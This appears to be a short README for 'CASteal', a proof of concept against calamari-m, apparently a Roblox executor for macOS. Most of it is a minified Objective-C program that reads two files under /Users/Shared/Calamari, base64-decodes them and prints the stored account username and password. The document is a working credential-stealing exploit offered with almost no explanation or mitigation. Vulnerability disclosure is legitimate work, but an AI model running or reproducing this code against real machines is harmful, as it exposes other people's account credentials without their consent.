# CASteal A.K.A. Pulling a fast one on calamari-m
## CASteal is a proof of concept for a security vulnerability in all versions of calamari-m for roblox
```mm
#import <Foundation/Foundation.h>
int main() {
    printf("Heres ur calamari account\nUsername: %s\nPassword: %s\n",[[[NSString alloc] initWithData:[[NSData alloc] initWithBase64EncodedString:[NSString stringWithContentsOfFile:@"/Users/Shared/Calamari/GY" encoding:NSUTF8StringEncoding error:nil] options:0] encoding:NSUTF8StringEncoding] UTF8String],[[[NSString alloc] initWithData:[[NSData alloc] initWithBase64EncodedString:[NSString stringWithContentsOfFile:@"/Users/Shared/Calamari/NGV" encoding:NSUTF8StringEncoding error:nil] options:0] encoding:NSUTF8StringEncoding] UTF8String]);
}
```
a minified version of the proof of concept is shown above.
